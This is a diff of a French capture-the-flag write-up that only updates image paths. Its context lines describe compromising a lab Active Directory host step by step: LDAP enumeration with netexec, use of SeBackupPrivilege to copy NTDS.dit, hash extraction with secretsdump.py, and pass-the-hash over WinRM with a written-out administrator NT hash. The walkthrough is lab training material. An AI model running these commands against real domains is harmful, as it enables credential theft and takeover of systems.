@@ -31,17 +31,17 @@ On tente d'énumerer les users ou les shares avec --users pui --shares mais sans
 
 Par contre avec ldap on obtient un retour pertinent :
 
-![i](20241213024523.png)
+![i](Images/20241213024523.png)
 
 Ensuite on obtient quelque chose d'encore plus pertinent graĉe au module get-desc-users de netexec en utilisant cette commande :
 nxc ldap 10.10.126.10 -u "" -p "" -M get-desc-users  
 
-![i](20241213024833.png)
+![i](Images/20241213024833.png)
 
 Le mdp qu'on obtient n'est pas valide pour aucun utilisateur
 Par contre on repère un msg d'erreur intéressant pour l'utilisateur Caroline.Robinson :
 
-![i](20241213031525.png)
+![i](Images/20241213031525.png)
 
 Le mdp est valide pour elle apparement mais elle doit changer de mdp.
 
@@ -52,7 +52,7 @@ On vérifie que cela a marché et ensuite on regarde les privilèges associés �
 
 nxc winrm 10.10.126.10 -u caroline.robinson -p "Password123" -X "whoami /priv" 
 
-![i](20241213061303.png)
+![i](Images/20241213061303.png)
 
 On remarque directement le privilège SeBackupPrivilege.
 On va utiliser cela pour récupérer le fichier NTDS.dit 
@@ -95,10 +95,10 @@ On utilise secretsdump pour pour extraire les hash des utilisateurs :
 secretsdump.py -ntds ntds.dit -system system.hive LOCAL
 ```
 
-![i](20241213062005.png)
+![i](Images/20241213062005.png)
 
 On utilise le hash NT de l'administrateur pour récupérer le dernier flag grâce à cette commande :
 
  nxc winrm 10.10.126.10 -u administrator -H ee4457ae59f1e3fbd764e33d9cef123d -X "cat C:\Users\Administrator\Desktop\root.txt"
  
-![i](20241213062049.png)
+![i](Images/20241213062049.png)
